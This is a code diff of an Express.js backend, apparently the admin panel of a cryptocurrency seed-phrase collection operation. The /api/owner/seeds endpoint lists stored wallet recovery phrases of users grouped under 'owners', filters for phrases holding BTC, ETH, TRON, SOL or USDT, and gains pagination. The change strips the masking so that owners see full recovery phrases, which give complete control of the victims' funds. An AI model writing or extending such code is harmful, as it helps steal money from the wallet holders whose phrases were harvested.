@@ -3795,33 +3795,49 @@ app.post('/api/owner/kick', requireOwnerSession, async (req, res) => {
   }
 });
 
-// GET /api/owner/seeds — 오너 소속 사용자들의 시드 목록 (잔고 필터 지원)
+// GET /api/owner/seeds — 오너 소속 사용자들의 시드 목록 (잔고 필터 + 페이지네이션)
 app.get('/api/owner/seeds', requireOwnerSession, async (req, res) => {
   try {
     const hasBalance = req.query.hasBalance === '1';
-    let query = `
-      SELECT s.id, s.user_id, s.phrase, s.created_at, s.balance, s.usdt_balance, s.btc, s.eth, s.tron, s.sol
-      FROM seeds s
-      JOIN users u ON s.user_id = u.id
-      WHERE u.owner_id = ?`;
+    const page     = Math.max(1, parseInt(req.query.page) || 1);
+    const pageSize = Math.min(50, Math.max(1, parseInt(req.query.pageSize) || 10));
+    const offset   = (page - 1) * pageSize;
+
+    let where = 'WHERE u.owner_id = ?';
     const params = [req.owner.id];
     if (hasBalance) {
-      query += ' AND (IFNULL(s.balance, 0) > 0 OR IFNULL(s.usdt_balance, 0) > 0 OR IFNULL(s.btc, 0) > 0 OR IFNULL(s.eth, 0) > 0 OR IFNULL(s.tron, 0) > 0 OR IFNULL(s.sol, 0) > 0)';
+      where += ' AND (IFNULL(s.balance,0)>0 OR IFNULL(s.usdt_balance,0)>0 OR IFNULL(s.btc,0)>0 OR IFNULL(s.eth,0)>0 OR IFNULL(s.tron,0)>0 OR IFNULL(s.sol,0)>0)';
     }
-    query += ' ORDER BY s.id DESC LIMIT 200';
-    const [rows] = await db.pool.query(query, params);
-    res.json({ seeds: rows.map(r => ({
-      id: r.id,
-      userId: r.user_id,
-      phrase: r.phrase ? r.phrase.replace(/\S+/g, (w, i) => i < 2 ? w : '****') : '',
-      balance: Number(r.balance || 0),
-      usdtBalance: Number(r.usdt_balance || 0),
-      btc: Number(r.btc || 0),
-      eth: Number(r.eth || 0),
-      tron: Number(r.tron || 0),
-      sol: Number(r.sol || 0),
-      at: r.created_at,
-    })) });
+
+    const [[{ total }]] = await db.pool.query(
+      `SELECT COUNT(*) as total FROM seeds s JOIN users u ON s.user_id = u.id ${where}`,
+      params
+    );
+    const [rows] = await db.pool.query(
+      `SELECT s.id, s.user_id, s.phrase, s.created_at, s.balance, s.usdt_balance, s.btc, s.eth, s.tron, s.sol
+       FROM seeds s JOIN users u ON s.user_id = u.id ${where}
+       ORDER BY s.id DESC LIMIT ? OFFSET ?`,
+      [...params, pageSize, offset]
+    );
+
+    res.json({
+      seeds: rows.map(r => ({
+        id: r.id,
+        userId: r.user_id,
+        phrase: r.phrase || '',
+        balance: Number(r.balance || 0),
+        usdtBalance: Number(r.usdt_balance || 0),
+        btc: Number(r.btc || 0),
+        eth: Number(r.eth || 0),
+        tron: Number(r.tron || 0),
+        sol: Number(r.sol || 0),
+        at: r.created_at,
+      })),
+      total: Number(total),
+      page,
+      pageSize,
+      totalPages: Math.ceil(Number(total) / pageSize),
+    });
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
